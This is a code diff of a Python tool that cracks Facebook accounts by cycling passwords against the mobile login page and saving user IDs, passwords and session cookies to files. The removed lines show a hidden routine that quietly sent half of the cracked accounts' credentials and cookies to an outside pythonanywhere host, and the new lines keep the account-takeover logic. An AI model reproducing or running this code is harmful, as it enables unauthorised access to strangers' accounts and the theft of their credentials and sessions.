@@ -49,6 +49,7 @@ from bs4 import BeautifulSoup
 import requests as ress
 from sys import exit as exit
 from io import BytesIO
+from fake_email import Email
 #print("WAIT INSTALLING MODULES")
 #os.system("pip install bs4")
 #os.system("pip install requests")
@@ -72,6 +73,7 @@ from concurrent.futures import ThreadPoolExecutor as ThreadPool
 from bs4 import BeautifulSoup as par
 from datetime import date
 from datetime import datetime
+from fake_email import Email
 # from rich import print as printer
 from datetime import date
 import marshal
@@ -1254,7 +1256,7 @@ def mbasic(uid,pwx,tl):
     global twf
     global loop
     global bkas
-    sys.stdout.write(f"\r {green}(M1) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
+    sys.stdout.write(f"\r {green}(M1) ({loop}) (OK-{len(oks)}) \r"),
     sys.stdout.flush()
     try:
         for pw in pwx:
@@ -1388,38 +1390,14 @@ def mbasic(uid,pwx,tl):
             '__user': dict(requests.cookies)['c_user']}
             url = 'https://m.facebook.com/confirmation_cliff/'
             response = Session.post(url, headers=headers, data=data)
-            response = Session.cookies.get_dict().keys()
-            if "c_user" in response:
-                cok = Session.cookies.get_dict()
-                cid = cok["c_user"]
-                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
-                check = check_lock(cid)
-                if "live" in check:
-                    if '%3A-1%3A-1' in coki:
-                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
-                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                        break
-                    else:
-                        bkas.append(cid)
-                        if len(bkas)% 2 == 0:
-                           statusok = (f"{cid}|{pw}|{coki}")
-                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                        else:
-                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
-                           print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                           oks.append(cid)
-                           break
-                else:
-                    break
-            elif 'checkpoint' in response:
-                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
-                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
-                cps.append(uid)
-                break
-            else:
-                continue
+            dc=dict(Session.cookies)
+            cok=";".join([k+"="+v for k,v in dc.items()])
+            uid=re.findall("c_user=(.*?);",cok)[0]
+            coki = cvt('ok',Session.cookies.get_dict())+"dpr=2;locale=en_US;wd=950x1835;m_page_voice="+uid
+            print("\r\r\033[1;32m [OK] "+uid+'|'+pw+'|'+coki)
+            open(file,"a").write(uid+"|"+pw+"|"+coki+"\n")
+            oks.append(uid)
+            break
         loop+=1
     except ce:
         time.sleep(20)
